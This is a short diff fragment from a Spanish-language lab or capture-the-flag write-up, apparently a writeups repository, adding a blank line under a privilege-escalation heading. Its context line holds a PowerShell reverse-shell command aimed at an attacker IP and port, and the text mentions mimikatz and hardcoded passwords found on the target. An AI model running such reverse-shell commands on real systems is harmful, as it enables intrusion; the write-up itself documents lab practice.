@@ -364,6 +364,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.34 -Port 6666
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/1629c207-44bc-44b8-86cc-4c4530bf144b)
 
 <h3>PrivEsc:</h3>
+
 - Bien, probé enumerar distintos servicios que habían en el equipo pero no encontré nada, ni siquiera con herramientas como `mimikatz`.
 - Solo encontré las contraseñas del usuario al que pertenecemos actualmente, hardcodeadas en el `GhostScript` dentro de la carpeta donde spawneamos:
 
